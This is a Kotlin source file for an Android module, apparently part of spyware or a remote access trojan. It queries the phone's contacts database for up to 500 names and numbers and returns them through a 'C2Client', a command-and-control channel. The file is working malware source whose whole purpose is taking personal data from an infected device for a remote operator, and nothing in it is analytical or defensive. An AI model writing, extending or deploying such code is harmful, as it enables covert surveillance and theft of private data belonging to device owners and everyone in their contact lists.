package com.ihk909.payload.modules

import android.content.Context
import android.provider.ContactsContract
import com.ihk909.payload.C2Client
import org.json.JSONArray
import org.json.JSONObject

object ContactModule {
    fun list(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        runCatching {
            val limit = args.optInt("limit", 500)
            val arr = JSONArray()
            ctx.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            )?.use { c ->
                var i = 0
                while (c.moveToNext() && i < limit) {
                    arr.put(JSONObject()
                        .put("name", c.getString(c.getColumnIndexOrThrow(
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
                        .put("number", c.getString(c.getColumnIndexOrThrow(
                            ContactsContract.CommonDataKinds.Phone.NUMBER))))
                    i++
                }
            }
            c2.reply(id, JSONObject().put("items", arr))
        }.onFailure { c2.replyError(id, it.message ?: "error") }
    }
}